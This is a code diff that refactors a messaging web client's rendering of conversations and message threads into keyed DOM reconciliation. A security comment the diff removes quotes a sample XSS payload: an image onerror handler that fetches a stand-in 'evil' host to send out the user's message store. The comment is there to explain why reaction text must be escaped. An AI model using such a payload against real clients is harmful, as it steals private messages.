@@ -8200,6 +8200,47 @@ body::after {
     console.warn('Reconnecting event stream:', reason, `(retry in ${Math.round(delay)}ms)`);
   }
 
+  function setKeyedRenderMetadata(el, key, signature) {
+    if (!el) return el;
+    el.dataset.renderKey = key;
+    el.dataset.renderSignature = signature;
+    return el;
+  }
+
+  function reconcileKeyedChildren(container, renderItems) {
+    if (!container) return [];
+    const existingByKey = new Map();
+    Array.from(container.children).forEach(child => {
+      const key = child.dataset ? child.dataset.renderKey : '';
+      if (key && !existingByKey.has(key)) {
+        existingByKey.set(key, child);
+      }
+    });
+
+    const desiredNodes = renderItems.map(item => {
+      const existing = existingByKey.get(item.key);
+      const node = existing && existing.dataset.renderSignature === item.signature
+        ? existing
+        : item.create();
+      return setKeyedRenderMetadata(node, item.key, item.signature);
+    });
+    const desiredSet = new Set(desiredNodes);
+    let cursor = container.firstElementChild;
+    desiredNodes.forEach(node => {
+      if (node === cursor) {
+        cursor = cursor.nextElementSibling;
+        return;
+      }
+      container.insertBefore(node, cursor);
+    });
+    Array.from(container.children).forEach(child => {
+      if (!desiredSet.has(child)) {
+        child.remove();
+      }
+    });
+    return desiredNodes;
+  }
+
   // ─── Render Conversations ───
   function renderConversations(convos, isSearch) {
     if (!isSearch) {
@@ -8212,8 +8253,8 @@ body::after {
     renderPlatformFilters(tabConvos);
     const visibleConvos = filterConversationsByPlatform(tabConvos);
     conversations = visibleConvos;
-    $convoList.innerHTML = '';
     if (!visibleConvos.length) {
+      $convoList.innerHTML = '';
       let emptyMsg = isSearch ? 'No results found' : 'No conversations yet';
       if (!isSearch && currentTab) {
         emptyMsg = currentTab === TAB_ARCHIVE
@@ -8228,17 +8269,47 @@ body::after {
       return;
     }
     const renderItems = buildConversationRenderItems(visibleConvos, isSearch);
-    renderItems.forEach(item => {
-      if (item.type === 'contact') {
-        $convoList.appendChild(createContactRow(item.identity, item.convos));
-        return;
-      }
-      $convoList.appendChild(createConversationRow(item.convo));
-    });
+    const keyedItems = renderItems.map((item, index) => conversationListRenderItem(item, index, !!isSearch));
+    reconcileKeyedChildren($convoList, keyedItems);
     hydrateNativeAvatars($convoList);
 
     // Update page title with total unread count
     updateTitleUnreadCount(convos);
+  }
+
+  function conversationListRenderItem(item, index, isSearch) {
+    if (item.type === 'contact') {
+      const key = `contact:${item.identity.key || index}`;
+      const routes = sortRouteConversations(item.convos || []);
+      return {
+        key,
+        signature: [
+          'contact',
+          key,
+          activeConversationIdentityKey(),
+          selectionMode ? 'selecting' : 'normal',
+          isSearch ? 'search' : 'list',
+          JSON.stringify(item.identity || {}),
+          JSON.stringify(routes || []),
+        ].join('::'),
+        create: () => createContactRow(item.identity, item.convos),
+      };
+    }
+    const convo = item.convo || {};
+    const key = `conversation:${convo.ConversationID || index}`;
+    return {
+      key,
+      signature: [
+        'conversation',
+        key,
+        activeConvoId || '',
+        selectionMode ? 'selecting' : 'normal',
+        selectedIds.has(convo.ConversationID) ? 'selected' : 'unselected',
+        isSearch ? 'search' : 'list',
+        JSON.stringify(convo),
+      ].join('::'),
+      create: () => createConversationRow(convo),
+    };
   }
 
   function escapeHtml(str) {
@@ -8854,6 +8925,310 @@ body::after {
     ta.style.height = Math.max(42, ta.scrollHeight) + 'px';
   }
 
+  function threadDateBucket(timestampMS) {
+    const d = new Date(Number(timestampMS || 0));
+    return `${d.getFullYear()}-${d.getMonth()}-${d.getDate()}`;
+  }
+
+  function threadDateDividerRenderItem(timestampMS) {
+    const key = `date:${threadDateBucket(timestampMS)}`;
+    const label = formatDateDivider(timestampMS);
+    return {
+      key,
+      signature: `${key}:${label}`,
+      create: () => {
+        const divider = document.createElement('div');
+        divider.className = 'date-divider';
+        divider.textContent = label;
+        return divider;
+      },
+    };
+  }
+
+  function threadMessageRenderKey(message, index) {
+    const id = String(message && message.MessageID || '');
+    return `msg:${id || `index-${index}`}`;
+  }
+
+  function threadSystemRenderItem(message, index) {
+    const key = `system:${String(message && message.MessageID || '') || `index-${index}`}`;
+    return {
+      key,
+      signature: `${key}:${messageRenderSignature(message)}`,
+      create: () => {
+        const sysEl = document.createElement('div');
+        sysEl.className = 'system-msg';
+        let sysText = message.Body || '';
+        if ((message.Status || '').includes('RCS')) {
+          sysText = '\uD83D\uDD12 ' + sysText;
+        } else if ((message.Status || '').includes('TEXT') || (message.Status || '').includes('SMS')) {
+          sysText = '\uD83D\uDCAC ' + sysText;
+        }
+        sysEl.textContent = sysText;
+        return sysEl;
+      },
+    };
+  }
+
+  function replyPreviewRenderSignature(message, messagesByID) {
+    if (!message || !message.ReplyToID) return '';
+    const original = messagesByID.get(String(message.ReplyToID || ''));
+    if (!original) return 'missing';
+    return [
+      original.SenderName || 'You',
+      original.Body || 'Media',
+      original.MediaID || '',
+      original.MimeType || '',
+    ].join(':');
+  }
+
+  function groupAvatarRenderSignature(message, nextMessage) {
+    if (!activeConvoIsGroup || !message || message.IsFromMe || !message.SenderName) return '';
+    if (!nextMessage) return 'last';
+    return [
+      nextMessage.IsFromMe ? 'me' : 'other',
+      nextMessage.SenderName || '',
+      nextMessage.Status || '',
+      isSameDay(message.TimestampMS, nextMessage.TimestampMS) ? 'same-day' : 'new-day',
+    ].join(':');
+  }
+
+  function threadMessageRenderSignature(message, context) {
+    return [
+      messageRenderSignature(message),
+      context.showMixedSourceChips ? 'mixed-source' : 'single-source',
+      activeConvoIsGroup ? 'group' : 'direct',
+      replyPreviewRenderSignature(message, context.messagesByID),
+      groupAvatarRenderSignature(message, context.nextMessage),
+    ].join('::');
+  }
+
+  function buildThreadMessageNode(message, context) {
+    const allMsgs = context.allMsgs;
+    const absoluteMessageIndex = context.absoluteMessageIndex;
+    const messagesByID = context.messagesByID;
+    const el = document.createElement('div');
+    el.className = 'msg ' + (message.IsFromMe ? 'sent' : 'received');
+
+    let html = '';
+
+    if (message.ReplyToID) {
+      const original = messagesByID.get(String(message.ReplyToID || ''));
+      const origName = original ? (original.SenderName || 'You') : '';
+      const origBody = original ? (original.Body || 'Media') : 'Original message';
+      const truncBody = origBody.length > 60 ? origBody.substring(0, 60) + '\u2026' : origBody;
+      html += `<div class="msg-reply-preview" data-reply-id="${escapeHtml(message.ReplyToID)}" onclick="scrollToMessage('${escapeHtml(message.ReplyToID)}')"><span class="reply-author">${escapeHtml(origName)}</span><span class="reply-body">${escapeHtml(truncBody)}</span></div>`;
+    }
+
+    if (activeConvoIsGroup && !message.IsFromMe && message.SenderName) {
+      html += `<div class="msg-sender" style="color:${avatarColor(message.SenderName)}">${escapeHtml(message.SenderName)}</div>`;
+    }
+    if (context.showMixedSourceChips) {
+      html += `<div class="msg-source-row">${platformBadgeHTML(sourcePlatformOf(message))}</div>`;
+    }
+    if (message.MediaID || message.MimeType) {
+      const mimeType = (message.MimeType || '').toLowerCase();
+      const isImage = mimeType.startsWith('image/');
+      const isAudio = mimeType.startsWith('audio/');
+      const isVideo = mimeType.startsWith('video/');
+      const hasMediaID = !!message.MediaID;
+      const mediaSrc = `/api/media/${encodeURIComponent(message.MessageID)}`;
+      const audioLabel = (message.Body === '[Voice note]' || message.Body === '[Audio]' || !message.Body) ? (message.Body === '[Voice note]' ? 'Voice note' : 'Audio message') : '';
+      const transcript = message.Transcript || message.transcript || '';
+      const transcriptModel = message.TranscriptModel || message.transcript_model || '';
+
+      if (hasMediaID && isImage) {
+        html += `<div class="msg-media">`;
+        html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(message.MessageID)}" data-kind="image"><div class="spinner"></div><span class="msg-media-loading-text">Fetching image...</span></div>`;
+        html += `<img src="${mediaSrc}" alt="Image" loading="lazy" decoding="async" onload="handleMediaLoad(this)" onerror="handleMediaError(this, 'image')" onclick="showFullscreen(this.src,'image')">`;
+        html += `</div>`;
+      } else if (hasMediaID && isAudio) {
+        html += `<div class="msg-media">`;
+        if (audioLabel) {
+          html += `<div class="msg-audio-label">${escapeHtml(audioLabel)}</div>`;
+        }
+        html += `<audio src="${mediaSrc}" controls preload="metadata"></audio>`;
+        if (transcript) {
+          html += `<div class="msg-transcript" title="${escapeHtml(transcriptModel || 'auto-transcribed')}">${escapeHtml(transcript)}</div>`;
+        }
+        html += `</div>`;
+      } else if (hasMediaID && isVideo) {
+        html += `<div class="msg-media">`;
+        html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(message.MessageID)}" data-kind="video"><div class="spinner"></div><span class="msg-media-loading-text">Fetching video...</span></div>`;
+        html += `<video src="${mediaSrc}" preload="none" controls playsinline style="display:none" onloadeddata="this.style.display='block';handleMediaLoad(this)" onerror="handleMediaError(this, 'video')" onclick="event.stopPropagation()"></video>`;
+        html += `</div>`;
+      } else if (!hasMediaID && (isImage || isAudio || isVideo)) {
+        const icon = isImage ? '\uD83D\uDDBC\uFE0F' : (isAudio ? '\uD83C\uDFA4' : '\uD83C\uDFA5');
+        const label = isImage ? 'Image' : (isAudio ? 'Audio' : 'Video');
+        html += `<div style="padding:12px;background:var(--bg-tertiary, #f0f0f0);border-radius:8px;text-align:center;color:var(--text-muted, #999);font-size:13px">${icon} ${label} from phone</div>`;
+      } else if (hasMediaID) {
+        html += `<div style="font-size:13px;color:var(--text-secondary);padding:6px 0">Attachment: ${escapeHtml(message.MimeType || 'file')}</div>`;
+      } else {
+        html += `<div style="font-size:13px;color:var(--text-muted);padding:6px 0">Attachment (${escapeHtml(message.MimeType || 'file')})</div>`;
+      }
+    }
+    const previewURL = message.Body ? extractMessageURLs(message.Body)[0] : '';
+    const shouldHideGenericMediaBody = !!message.MediaID && isGenericMediaBody(message.Body);
+    if (message.Body && !shouldHideGenericMediaBody) {
+      html += `<div class="msg-body">${linkifyMessageBody(message.Body)}</div>`;
+      if (previewURL) {
+        html += `<div class="msg-link-preview-shell" data-preview-url="${escapeHtml(previewURL)}"></div>`;
+      }
+    }
+    if (!message.Body && !message.MediaID) {
+      html += `<div class="msg-body" style="color:var(--text-muted);font-style:italic">Empty message</div>`;
+    }
+
+    if (message.Reactions) {
+      try {
+        const reactions = JSON.parse(message.Reactions);
+        if (reactions.length > 0) {
+          html += '<div class="msg-reactions">';
+          reactions.forEach(r => {
+            const count = Number(r.count) || 0;
+            const emoji = escapeHtml(r.emoji || '');
+            const tip = escapeHtml(reactionTooltip(r, activeConversation));
+            html += `<span class="reaction-pill" title="${tip}">${emoji}<span class="reaction-count">${count > 1 ? count : ''}</span></span>`;
+          });
+          html += '</div>';
+        }
+      } catch(e) {}
+    }
+
+    html += `<div class="msg-time">${formatMessageTime(message.TimestampMS)}${message.IsFromMe ? formatStatusIndicator(message.Status) : ''}</div>`;
+    html += `<div class="msg-actions">`;
+    html += `<button class="action-react" title="React"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg></button>`;
+    html += `<button class="action-reply" title="Reply"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 17 4 12 9 7"/><path d="M20 18v-2a4 4 0 0 0-4-4H4"/></svg></button>`;
+    html += `<button class="action-forward" title="Forward" aria-label="Forward message" ${messageHasForwardableContent(message) ? '' : 'disabled'}><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 17 20 12 15 7"/><path d="M4 18v-2a4 4 0 0 1 4-4h12"/><polyline points="13 6 18 1 23 6"/><path d="M11 12h7"/></svg></button>`;
+    html += `</div>`;
+
+    const safeMsgId = escapeHtml(message.MessageID);
+    html += `<div class="emoji-picker" id="emoji-${safeMsgId}">`;
+    QUICK_EMOJIS.forEach(e => {
+      const safeEmoji = escapeHtml(e);
+      html += `<button onclick="sendReaction('${safeMsgId}','${safeEmoji}')">${safeEmoji}</button>`;
+    });
+    html += `<button class="emoji-plus" data-msg-id="${safeMsgId}" onclick="toggleFullEmojiPanel(event, '${safeMsgId}')">+</button>`;
+    html += '</div>';
+    html += `<div class="emoji-full-panel" id="emoji-full-${safeMsgId}"></div>`;
+
+    el.innerHTML = html;
+    el.dataset.msgId = message.MessageID;
+
+    el.querySelector('.action-react').addEventListener('click', (e) => {
+      e.stopPropagation();
+      document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
+      const picker = document.getElementById('emoji-' + message.MessageID);
+      if (picker) picker.classList.toggle('show');
+    });
+    el.querySelector('.action-reply').addEventListener('click', (e) => {
+      e.stopPropagation();
+      setReplyTo(message);
+    });
+    el.querySelector('.action-forward').addEventListener('click', (e) => {
+      e.stopPropagation();
+      openForwardDialog(message);
+    });
+    el.addEventListener('contextmenu', (event) => {
+      openContextMenu(event, messageContextMenuItems(message), { type: 'message', message });
+    });
+
+    if (activeConvoIsGroup && !message.IsFromMe && message.SenderName) {
+      const nextMsg = allMsgs[absoluteMessageIndex + 1];
+      const isLastFromSender = !nextMsg || nextMsg.IsFromMe || nextMsg.SenderName !== message.SenderName ||
+        (nextMsg.Status || '').startsWith('TOMBSTONE_') || !isSameDay(message.TimestampMS, nextMsg.TimestampMS);
+
+      const row = document.createElement('div');
+      row.className = 'msg-row received';
+      const avatarDiv = document.createElement('div');
+      avatarDiv.className = 'msg-avatar' + (isLastFromSender ? '' : ' avatar-hidden');
+      const avatarRefs = senderAvatarRefs(message);
+      renderAvatarElement(avatarDiv, {
+        name: message.SenderName,
+        numbers: uniqueAvatarNumbers([message.SenderNumber]),
+        whatsAppConversationID: senderAvatarWhatsAppConversationID(message),
+        avatarSource: avatarRefs.source,
+        participantIDs: avatarRefs.participantIDs,
+        contactIDs: avatarRefs.contactIDs,
+        text: initials(message.SenderName).charAt(0),
+        background: avatarColor(message.SenderName),
+      });
+      row.appendChild(avatarDiv);
+      row.appendChild(el);
+      return row;
+    }
+    return el;
+  }
+
+  function buildThreadDraftNode(draft, canSendActiveRoute, draftTextareasToAutosize) {
+    const draftEl = document.createElement('div');
+    draftEl.className = 'draft-banner';
+    draftEl.dataset.draftId = String(draft.DraftID || '');
+    draftEl.innerHTML = `
+      <div class="draft-label">AI Draft</div>
+      <textarea class="draft-text" rows="2"></textarea>
+      <div class="draft-actions">
+        <button class="draft-discard-btn" onclick="discardDraft('${escapeHtml(draft.DraftID)}')">Discard</button>
+        <button class="draft-send-btn" onclick="sendDraft('${escapeHtml(draft.DraftID)}', this)" ${canSendActiveRoute ? '' : `disabled title="${escapeHtml(routeUnavailableMessage('send drafts', activeConversation))}"`}>Send</button>
+      </div>
+    `;
+    const ta = draftEl.querySelector('textarea');
+    ta.value = draftDisplayBody(draft);
+    draftTextareasToAutosize.push(ta);
+    ta.addEventListener('input', () => {
+      draftEdits.set(String(draft.DraftID || ''), ta.value);
+      autosizeDraftTextarea(ta);
+    });
+    return draftEl;
+  }
+
+  function buildThreadRenderItems(renderWindow, allMsgs, drafts, showMixedSourceChips, canSendActiveRoute, messagesByID, draftTextareasToAutosize) {
+    const items = [];
+    let lastDate = 0;
+    renderWindow.messages.forEach((message, index) => {
+      const absoluteMessageIndex = renderWindow.start + index;
+      if (!isSameDay(message.TimestampMS, lastDate)) {
+        items.push(threadDateDividerRenderItem(message.TimestampMS));
+        lastDate = message.TimestampMS;
+      }
+      if ((message.Status || '').startsWith('TOMBSTONE_')) {
+        items.push(threadSystemRenderItem(message, absoluteMessageIndex));
+        return;
+      }
+      const context = {
+        allMsgs,
+        absoluteMessageIndex,
+        messagesByID,
+        showMixedSourceChips,
+        nextMessage: allMsgs[absoluteMessageIndex + 1],
+      };
+      const key = threadMessageRenderKey(message, absoluteMessageIndex);
+      const signature = threadMessageRenderSignature(message, context);
+      items.push({
+        key,
+        signature,
+        create: () => buildThreadMessageNode(message, context),
+      });
+    });
+
+    drafts.forEach((draft, index) => {
+      const draftId = String(draft.DraftID || '');
+      const key = `draft:${draftId || `index-${index}`}`;
+      const signature = [
+        key,
+        draftDisplayBody(draft),
+        canSendActiveRoute ? 'sendable' : 'read-only',
+        canSendActiveRoute ? '' : routeUnavailableMessage('send drafts', activeConversation),
+      ].join('::');
+      items.push({
+        key,
+        signature,
+        create: () => buildThreadDraftNode(draft, canSendActiveRoute, draftTextareasToAutosize),
+      });
+    });
+    return items;
+  }
+
   function renderLoadedMessages({older = false, previousScrollTop = 0, previousScrollHeight = 0, stickToBottom = false, preserveAnchor = null} = {}) {
     const allMsgs = loadedMessages;
     const drafts = loadedDrafts;
@@ -8877,261 +9252,28 @@ body::after {
     lastThreadSignature = sig;
 
     captureDraftEdits();
-    $messagesArea.innerHTML = '';
-    const fragment = document.createDocumentFragment();
     const draftTextareasToAutosize = [];
-    let lastDate = 0;
+    const renderItems = buildThreadRenderItems(renderWindow, allMsgs, drafts, showMixedSourceChips, canSendActiveRoute, messagesByID, draftTextareasToAutosize);
+    reconcileKeyedChildren($messagesArea, renderItems);
+    draftTextareasToAutosize.forEach(autosizeDraftTextarea);
 
-    msgs.forEach((m, mi) => {
-        const absoluteMessageIndex = renderWindow.start + mi;
-        // Date divider
-        if (!isSameDay(m.TimestampMS, lastDate)) {
-          const divider = document.createElement('div');
-          divider.className = 'date-divider';
-          divider.textContent = formatDateDivider(m.TimestampMS);
-          fragment.appendChild(divider);
-          lastDate = m.TimestampMS;
-        }
-
-        // System/tombstone messages (protocol switches, chat creation)
-        if ((m.Status || '').startsWith('TOMBSTONE_')) {
-          const sysEl = document.createElement('div');
-          sysEl.className = 'system-msg';
-          let sysText = m.Body || '';
-          if (m.Status.includes('RCS')) {
-            sysText = '🔒 ' + sysText;
-          } else if (m.Status.includes('TEXT') || m.Status.includes('SMS')) {
-            sysText = '💬 ' + sysText;
-          }
-          sysEl.textContent = sysText;
-          fragment.appendChild(sysEl);
-          return;
-        }
-
-        const el = document.createElement('div');
-        el.className = 'msg ' + (m.IsFromMe ? 'sent' : 'received');
-
-        let html = '';
-
-        // Reply banner
-        if (m.ReplyToID) {
-          const original = messagesByID.get(String(m.ReplyToID || ''));
-          const origName = original ? (original.SenderName || 'You') : '';
-          const origBody = original ? (original.Body || 'Media') : 'Original message';
-          const truncBody = origBody.length > 60 ? origBody.substring(0, 60) + '\u2026' : origBody;
-          html += `<div class="msg-reply-preview" data-reply-id="${escapeHtml(m.ReplyToID)}" onclick="scrollToMessage('${escapeHtml(m.ReplyToID)}')"><span class="reply-author">${escapeHtml(origName)}</span><span class="reply-body">${escapeHtml(truncBody)}</span></div>`;
-        }
-
-        if (activeConvoIsGroup && !m.IsFromMe && m.SenderName) {
-          html += `<div class="msg-sender" style="color:${avatarColor(m.SenderName)}">${escapeHtml(m.SenderName)}</div>`;
-        }
-        if (showMixedSourceChips) {
-          html += `<div class="msg-source-row">${platformBadgeHTML(sourcePlatformOf(m))}</div>`;
-        }
-        if (m.MediaID || m.MimeType) {
-          const mimeType = (m.MimeType || '').toLowerCase();
-          const isImage = mimeType.startsWith('image/');
-          const isAudio = mimeType.startsWith('audio/');
-          const isVideo = mimeType.startsWith('video/');
-          const hasMediaID = !!m.MediaID;
-          const mediaSrc = `/api/media/${encodeURIComponent(m.MessageID)}`;
-          const audioLabel = (m.Body === '[Voice note]' || m.Body === '[Audio]' || !m.Body) ? (m.Body === '[Voice note]' ? 'Voice note' : 'Audio message') : '';
-          const transcript = m.Transcript || m.transcript || '';
-          const transcriptModel = m.TranscriptModel || m.transcript_model || '';
-
-          if (hasMediaID && isImage) {
-            html += `<div class="msg-media">`;
-            html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(m.MessageID)}" data-kind="image"><div class="spinner"></div><span class="msg-media-loading-text">Fetching image...</span></div>`;
-            html += `<img src="${mediaSrc}" alt="Image" loading="lazy" decoding="async" onload="handleMediaLoad(this)" onerror="handleMediaError(this, 'image')" onclick="showFullscreen(this.src,'image')">`;
-            html += `</div>`;
-          } else if (hasMediaID && isAudio) {
-            html += `<div class="msg-media">`;
-            if (audioLabel) {
-              html += `<div class="msg-audio-label">${escapeHtml(audioLabel)}</div>`;
-            }
-            html += `<audio src="${mediaSrc}" controls preload="metadata"></audio>`;
-            if (transcript) {
-              html += `<div class="msg-transcript" title="${escapeHtml(transcriptModel || 'auto-transcribed')}">${escapeHtml(transcript)}</div>`;
-            }
-            html += `</div>`;
-          } else if (hasMediaID && isVideo) {
-            html += `<div class="msg-media">`;
-            html += `<div class="msg-media-loading" data-msg-id="${escapeHtml(m.MessageID)}" data-kind="video"><div class="spinner"></div><span class="msg-media-loading-text">Fetching video...</span></div>`;
-            html += `<video src="${mediaSrc}" preload="none" controls playsinline style="display:none" onloadeddata="this.style.display='block';handleMediaLoad(this)" onerror="handleMediaError(this, 'video')" onclick="event.stopPropagation()"></video>`;
-            html += `</div>`;
-          } else if (!hasMediaID && (isImage || isAudio || isVideo)) {
-            const icon = isImage ? '\uD83D\uDDBC\uFE0F' : (isAudio ? '\uD83C\uDFA4' : '\uD83C\uDFA5');
-            const label = isImage ? 'Image' : (isAudio ? 'Audio' : 'Video');
-            html += `<div style="padding:12px;background:var(--bg-tertiary, #f0f0f0);border-radius:8px;text-align:center;color:var(--text-muted, #999);font-size:13px">${icon} ${label} from phone</div>`;
-          } else if (hasMediaID) {
-            html += `<div style="font-size:13px;color:var(--text-secondary);padding:6px 0">Attachment: ${escapeHtml(m.MimeType || 'file')}</div>`;
-          } else {
-            html += `<div style="font-size:13px;color:var(--text-muted);padding:6px 0">Attachment (${escapeHtml(m.MimeType || 'file')})</div>`;
-          }
-        }
-        const previewURL = m.Body ? extractMessageURLs(m.Body)[0] : '';
-        const shouldHideGenericMediaBody = !!m.MediaID && isGenericMediaBody(m.Body);
-        if (m.Body && !shouldHideGenericMediaBody) {
-          html += `<div class="msg-body">${linkifyMessageBody(m.Body)}</div>`;
-          if (previewURL) {
-            html += `<div class="msg-link-preview-shell" data-preview-url="${escapeHtml(previewURL)}"></div>`;
-          }
-        }
-        if (!m.Body && !m.MediaID) {
-          html += `<div class="msg-body" style="color:var(--text-muted);font-style:italic">Empty message</div>`;
-        }
-
-        // Reactions
-        //
-        // SECURITY: r.emoji is attacker-controlled. WhatsApp and Signal both
-        // accept arbitrary strings as reaction "text" at the protocol level —
-        // whatsmeow's reaction.GetText() and signal-cli's reaction.Emoji are
-        // raw bytes, not validated graphemes. A crafted reaction like
-        //   <img src=x onerror="fetch('https://evil/'+btoa(...))">
-        // rendered via innerHTML without escaping would fire on paint and
-        // exfiltrate the entire local message store (same-origin access to
-        // /api/messages). Always escape.
-        if (m.Reactions) {
-          try {
-            const reactions = JSON.parse(m.Reactions);
-            if (reactions.length > 0) {
-              html += '<div class="msg-reactions">';
-              reactions.forEach(r => {
-                const count = Number(r.count) || 0;
-                const emoji = escapeHtml(r.emoji || '');
-                const tip = escapeHtml(reactionTooltip(r, activeConversation));
-                html += `<span class="reaction-pill" title="${tip}">${emoji}<span class="reaction-count">${count > 1 ? count : ''}</span></span>`;
-              });
-              html += '</div>';
-            }
-          } catch(e) {}
-        }
-
-        html += `<div class="msg-time">${formatMessageTime(m.TimestampMS)}${m.IsFromMe ? formatStatusIndicator(m.Status) : ''}</div>`;
-
-        // Hover action bar (Google Messages style)
-        html += `<div class="msg-actions">`;
-        html += `<button class="action-react" title="React"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg></button>`;
-        html += `<button class="action-reply" title="Reply"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 17 4 12 9 7"/><path d="M20 18v-2a4 4 0 0 0-4-4H4"/></svg></button>`;
-        html += `<button class="action-forward" title="Forward" aria-label="Forward message" ${messageHasForwardableContent(m) ? '' : 'disabled'}><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 17 20 12 15 7"/><path d="M4 18v-2a4 4 0 0 1 4-4h12"/><polyline points="13 6 18 1 23 6"/><path d="M11 12h7"/></svg></button>`;
-        html += `</div>`;
-
-        // Emoji picker (hidden, toggled by react button). MessageID is
-        // server-assigned (e.g. "whatsapp:<stanzaID>") but still goes through
-        // escapeHtml defensively since it's interpolated into both attribute
-        // values and onclick JS string literals.
-        const safeMsgId = escapeHtml(m.MessageID);
-        html += `<div class="emoji-picker" id="emoji-${safeMsgId}">`;
-        QUICK_EMOJIS.forEach(e => {
-          const safeEmoji = escapeHtml(e);
-          html += `<button onclick="sendReaction('${safeMsgId}','${safeEmoji}')">${safeEmoji}</button>`;
-        });
-        html += `<button class="emoji-plus" data-msg-id="${safeMsgId}" onclick="toggleFullEmojiPanel(event, '${safeMsgId}')">+</button>`;
-        html += '</div>';
-
-        // Full emoji panel is hydrated on demand instead of for every message upfront.
-        html += `<div class="emoji-full-panel" id="emoji-full-${safeMsgId}"></div>`;
-
-        el.innerHTML = html;
-        el.dataset.msgId = m.MessageID;
-
-        // Action bar: React button → toggle emoji picker
-        el.querySelector('.action-react').addEventListener('click', (e) => {
-          e.stopPropagation();
-          document.querySelectorAll('.emoji-picker.show').forEach(p => p.classList.remove('show'));
-          const picker = document.getElementById('emoji-' + m.MessageID);
-          if (picker) picker.classList.toggle('show');
-        });
-
-        // Action bar: Reply button
-        el.querySelector('.action-reply').addEventListener('click', (e) => {
-          e.stopPropagation();
-          setReplyTo(m);
-        });
-
-        el.querySelector('.action-forward').addEventListener('click', (e) => {
-          e.stopPropagation();
-          openForwardDialog(m);
-        });
-
-        el.addEventListener('contextmenu', (event) => {
-          openContextMenu(event, messageContextMenuItems(m), { type: 'message', message: m });
-        });
-
-        // In group chats, wrap received messages with an avatar
-        if (activeConvoIsGroup && !m.IsFromMe && m.SenderName) {
-          // Show avatar only for the last message in a consecutive run from the same sender
-          const nextMsg = allMsgs[absoluteMessageIndex + 1];
-          const isLastFromSender = !nextMsg || nextMsg.IsFromMe || nextMsg.SenderName !== m.SenderName ||
-            (nextMsg.Status || '').startsWith('TOMBSTONE_') || !isSameDay(m.TimestampMS, nextMsg.TimestampMS);
-
-          const row = document.createElement('div');
-          row.className = 'msg-row received';
-          const avatarDiv = document.createElement('div');
-          avatarDiv.className = 'msg-avatar' + (isLastFromSender ? '' : ' avatar-hidden');
-          const avatarRefs = senderAvatarRefs(m);
-          renderAvatarElement(avatarDiv, {
-            name: m.SenderName,
-            numbers: uniqueAvatarNumbers([m.SenderNumber]),
-            whatsAppConversationID: senderAvatarWhatsAppConversationID(m),
-            avatarSource: avatarRefs.source,
-            participantIDs: avatarRefs.participantIDs,
-            contactIDs: avatarRefs.contactIDs,
-            text: initials(m.SenderName).charAt(0),
-            background: avatarColor(m.SenderName),
-          });
-          row.appendChild(avatarDiv);
-          row.appendChild(el);
-          fragment.appendChild(row);
-        } else {
-          fragment.appendChild(el);
-        }
-      });
-
-      // Load drafts for this conversation
-      drafts.forEach(draft => {
-        const draftEl = document.createElement('div');
-        draftEl.className = 'draft-banner';
-        draftEl.dataset.draftId = String(draft.DraftID || '');
-        draftEl.innerHTML = `
-          <div class="draft-label">AI Draft</div>
-          <textarea class="draft-text" rows="2"></textarea>
-          <div class="draft-actions">
-            <button class="draft-discard-btn" onclick="discardDraft('${escapeHtml(draft.DraftID)}')">Discard</button>
-            <button class="draft-send-btn" onclick="sendDraft('${escapeHtml(draft.DraftID)}', this)" ${canSendActiveRoute ? '' : `disabled title="${escapeHtml(routeUnavailableMessage('send drafts', activeConversation))}"`}>Send</button>
-          </div>
-        `;
-        fragment.appendChild(draftEl);
-        const ta = draftEl.querySelector('textarea');
-        ta.value = draftDisplayBody(draft);
-        draftTextareasToAutosize.push(ta);
-        ta.addEventListener('input', () => {
-          draftEdits.set(String(draft.DraftID || ''), ta.value);
-          autosizeDraftTextarea(ta);
-        });
-      });
-
-      $messagesArea.appendChild(fragment);
-      draftTextareasToAutosize.forEach(autosizeDraftTextarea);
-
-      // Update protocol indicator in header from most recent tombstone
-      // msgs are in chronological order (oldest first), so findLast gets the latest
-      const lastTombstone = allMsgs.findLast(m => (m.Status || '').startsWith('TOMBSTONE_'));
-      let protocolDetail = '';
-      if (lastTombstone) {
-        if (lastTombstone.Status.includes('RCS')) {
-          protocolDetail = 'RCS';
-        } else if (lastTombstone.Status.includes('TEXT') || lastTombstone.Status.includes('SMS')) {
-          protocolDetail = 'Text';
-        }
+    // Update protocol indicator in header from most recent tombstone.
+    const lastTombstone = allMsgs.findLast(m => (m.Status || '').startsWith('TOMBSTONE_'));
+    let protocolDetail = '';
+    if (lastTombstone) {
+      if (lastTombstone.Status.includes('RCS')) {
+        protocolDetail = 'RCS';
+      } else if (lastTombstone.Status.includes('TEXT') || lastTombstone.Status.includes('SMS')) {
+        protocolDetail = 'Text';
       }
-      refreshConversationChrome(protocolDetail);
-      hydrateLinkPreviews();
-      hydrateNativeAvatars($messagesArea);
-      hydrateMediaElements($messagesArea);
-      scheduleMediaLoaderLabels($messagesArea);
-      observeThreadContentResize();
-      observeThreadViewportResize();
+    }
+    refreshConversationChrome(protocolDetail);
+    hydrateLinkPreviews();
+    hydrateNativeAvatars($messagesArea);
+    hydrateMediaElements($messagesArea);
+    scheduleMediaLoaderLabels($messagesArea);
+    observeThreadContentResize();
+    observeThreadViewportResize();
 
     if (preserveAnchor && restoreThreadViewportAnchor(preserveAnchor)) {
       syncThreadBottomFollowState();
